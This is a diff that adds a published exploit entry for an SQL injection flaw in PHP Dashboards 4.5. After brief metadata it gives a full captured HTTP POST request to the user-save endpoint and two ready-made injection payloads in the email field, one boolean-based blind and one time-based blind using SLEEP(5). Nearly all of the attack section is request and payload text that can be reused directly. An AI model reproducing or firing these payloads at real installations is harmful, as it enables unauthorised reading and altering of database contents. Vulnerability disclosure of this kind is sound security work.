@@ -1,0 +1,54 @@
+# Exploit Title: PHP Dashboards 4.5 - SQL Injection
+# Dork: N/A
+# Date: 2018-05-23
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/php-dashboards-v50-brand-new-enterprise-edition/21540104
+# Version: v4.5
+# Category: Webapps
+# Tested on: Kali linux
+# Description: 
+# PHP Dashboards is prone to an SQL-injection vulnerability
+# because it fails to sufficiently sanitize user-supplied data before using
+# it in an SQL query.Exploiting this issue could allow an attacker to
+# compromise the application, access or modify data, or exploit latent
+# vulnerabilities in the underlying database.
+
+# PoC: SQLi:
+
+http://Target/php/save/user.php?mode=add
+
+POST /php/save/user.php?mode=add HTTP/1.1
+Host: phpdashboardv5.dataninja.biz
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://phpdashboardv5.dataninja.biz/
+Content-Length: 152
+Cookie: PHPSESSID=f4ducgk49cgei129vs7qfl10g7
+Connection: keep-alive
+email=test2%40gmail.com&password=test123&dashboardKey=&url=
+phpdashboardv5.dataninja.biz
+%2Fphp%2Fsave%2F%3Fmode%3Dcollaborate%26email%3Dtest2%40gmail.com
+
+
+# Vulnerable Payload:
+# Parameter: email (POST)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+# Payload: 
+
+email=test2@gmail.com' AND 6800=6800 AND
+'fACB'='fACB&password=test123&dashboardKey=&url=
+Target/php/save/?mode=collaborate%26email=test2@gmail.com
+
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind
+# Payload: 
+
+email=test2@gmail.com' AND SLEEP(5) AND
+'zgpA'='zgpA&password=test123&dashboardKey=&url=
+Target/php/save/?mode=collaborate%26email=test2@gmail.com
